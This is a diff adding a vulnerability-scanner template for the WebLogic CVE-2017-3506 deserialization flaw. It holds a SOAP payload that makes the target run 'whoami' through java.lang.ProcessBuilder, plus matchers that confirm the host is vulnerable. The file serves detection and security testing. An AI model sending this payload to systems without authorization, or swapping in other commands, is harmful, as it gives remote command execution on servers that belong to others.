@@ -1,0 +1,35 @@
+id: weblogic_2017_3506
+type: default
+info:
+  name: Weblogic CVE-2017-3506 反序列化漏洞
+  risk: High
+  cve: CVE-2017-3506
+
+requests:
+  - method: POST
+    redirect: false
+    url: '{{.URL.Scheme}}://{{.URL.Host}}/wls-wsat/CoordinatorPortType'
+    headers:
+      Content-Type: text/xml
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+        <soapenv:Header>
+      	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      	  <java>
+      		<object class="java.lang.ProcessBuilder">
+      		  <array class="java.lang.String" length="1">
+      			 <void index="0">
+      			   <string>whoami</string>
+      			 </void>
+      		  </array>
+      		  <void method="start"/>
+      		</object>
+      	  </java>
+      	</work:WorkContext>
+        </soapenv:Header>
+        <soapenv:Body/>
+      </soapenv:Envelope>
+
+    matchers:
+      - dsl:
+          - "contains(body, '<faultstring>0') && contains(body, '<faultstring>java.lang.ProcessBuilder')"
